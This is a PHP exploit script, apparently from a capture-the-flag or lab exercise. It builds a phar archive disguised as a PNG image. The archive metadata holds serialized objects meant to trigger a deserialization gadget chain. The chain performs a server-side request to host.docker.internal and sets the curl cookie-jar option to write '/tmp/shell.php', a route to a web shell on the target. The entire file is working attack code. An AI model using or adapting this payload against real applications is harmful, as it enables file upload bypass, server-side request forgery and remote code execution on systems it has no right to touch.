<?php
class PreviewState {
    public $endpoint;
    private $headers;
    private $payload;
    private $sessionNote;

    public function __construct($endpoint, $payload, $sessionNote, $headers) {
        $this->endpoint = $endpoint;
        $this->payload = $payload;
        $this->sessionNote = $sessionNote;
        $this->headers = $headers;
    }
}

class PendingPreview {
    public $state;
    public function __construct($state) {
        $this->state = $state;
    }
}
$headers = [10082 => '/tmp/shell.php']; // CURLOPT_COOKIEJAR
$state = new PreviewState('http://host.docker.internal:8000/', 'trigger=1', 'ignored', $headers);
$obj = new PendingPreview($state);

$phar = new Phar('ssrf2.phar');
$phar->startBuffering();
$phar->addFromString('test.png', 'test');
$phar->setStub("<?php __HALT_COMPILER(); ?>");
$phar->setMetadata($obj);
$phar->stopBuffering();
rename('ssrf2.phar', 'ssrf2.png');
?>